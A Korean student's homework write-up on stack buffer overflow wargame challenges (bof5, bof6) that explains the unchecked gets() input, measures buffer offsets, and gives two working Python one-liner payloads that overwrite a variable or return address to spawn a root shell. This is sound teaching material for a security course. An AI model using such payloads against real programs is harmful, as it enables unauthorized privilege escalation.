# GBC Security_07

## HW #7

### Buffer Overflow
---

#### 0. main idea
*  `gets()`함수와 `strcpy()`함수는 입력받는 data의 크기를 검사하지 않기 때문에, 정해진 메모리의 크기를 초과하여 data가 전달되었을 경우, 초과한 data가 그대로 stack에 저장되게 된다. 이 취약점을 이용한 return address를 원하는 주소로 덮어 씌울 수 있다. 

	> 인자에 buf보다 큰 값을 전달하면, innocent 변수 직전까지 값이 채워져 그 이후 입력한 값이 innocent 변수를 덮어쓸 수 있게 될 것이다. (bof 1 - 5)



#### 1. bof5

> gets()의 취약점 이용함을 알 수 있다.

![bof6](https://user-images.githubusercontent.com/47182864/61315366-93560080-a839-11e9-9110-cae98865dc72.png)

> `gets()`가 차지하는 메모리의 크기를 알아야 한다. 따라서, `innocent의 주소값 - 해당 함수의 시작 주소값`을 해주면 함수가 차지하는 메모리의 크기를 구할 수 있다.

![bof6-2](https://user-images.githubusercontent.com/47182864/61315363-93560080-a839-11e9-8d32-95e7f4f5ed9f.png)

> `system()`에서 인자로 input값인 buf를 받고 있기 때문에, shell로 실행하기 위해서는 shell을 실행시킬 수 있는 명령으로 입력해야 함을 알 수 있다.

![bof6-3](https://user-images.githubusercontent.com/47182864/61315364-93560080-a839-11e9-8a88-28b3b1e15c92.png)

> 따라서, 다음과 같은 명령으로 root shell을 탈취할 수 있다.

```shell
(python -c "print '/bin/sh\x00'+'\x78\x56\x34\x12'*34";cat) | ./bof5
```
> >`/bin/sh\x00` : `/bin/sh`는 shell을 실행시키기 위함이고, `\x00`은 문자열의 끝을 알리는 null byte이다.  
> >`\x78\x56\x34\x12*34` : KEY값 0x12345678을 16진수로 저장하기 위해서는 \x를 사용하여 리틀엔디안 방식으로 기입해야한다. 이 KEY값을 34번 반복하여 입력한다.
> >`cat` : 표준 입력이 끊기지 않도록 해준다.  
> >`|` : 파이프 라인을 이용하여 출력할 값을 표준 출력으로 보낸 후, 다음 프로세스의 표준 입력으로 전달한다.


> [ result ]

![r5](https://user-images.githubusercontent.com/47182864/61317274-a5d23900-a83d-11e9-9094-6429d81e5be9.png)

#### 2. bof6

> gets()의 취약점 이용함을 알 수 있다.  
> system()함수가 shell을 호출하지 않으니, shell코드를 직접 전달해줘야 함을 알 수 있다.

![bof6](https://user-images.githubusercontent.com/47182864/61318142-5a208f00-a83f-11e9-8a1d-3434db18a2d4.png)

> `ret`일 때의 `rsp` 주소값에서 `gets()`의 시작 주소값을 빼서 buf의 크기를 구해준다.

![bof6-2](https://user-images.githubusercontent.com/47182864/61318140-5987f880-a83f-11e9-8d87-2024584d5fd3.png)
![bof6-3](https://user-images.githubusercontent.com/47182864/61318141-5a208f00-a83f-11e9-9c4c-0895c02b07e9.png)

> shellcode:0x601050일 때, 다음과 같은 명령으로 root shell 탈취 가능

```shell
(python -c "print 'G'*136+'\x50\x10\x60\x00\x00\x00\x00\x00'";cat) | ./bof6
```
> >`'G'*136` : G로 136만큼 덮어준다.
> >`\x50\x10\x60\x00\x00\x00\x00\x00` : shell code의 시작 주소를 리틀 엔디안 형식으로 입력해준다 (8byte).

> [ result ]

![r6](https://user-images.githubusercontent.com/47182864/61319738-ca7cdf80-a842-11e9-8371-5d3f63ebdf94.png)

##### +) plus
* 아래와 같이 랜덤한 값을 넣어가며 버퍼의 크기를 예측할 수도 있다.
* 아래에서 135를 입력했을 때는 segmentation fault가 뜨지 않는데, 136을 입력하면 segmentation fault가 뜬다. 이 경우, 135가 buffer의 크기일까? __buffer의 크기는 136이다.__
* 136일때 segmentation fault가 뜨는 이유는, 뒤에 null byte까지 채워져서 그런 것이라고 한다.
![plus](https://user-images.githubusercontent.com/47182864/61319889-3a8b6580-a843-11e9-8d80-fc8d03371d20.png)

#### 3. bof8

내일 해야징 . . 


	
---
### 2. Etc
---
양질의 컨텐츠 , , 찬솔님 최고 __빛 찬 솔__. 

---
### 3. plus
---
참고 및 좋은 자료
<https://redscreen.tistory.com/29>  
쉘코드 만들기
<https://bob3rdnewbie.tistory.com/124>

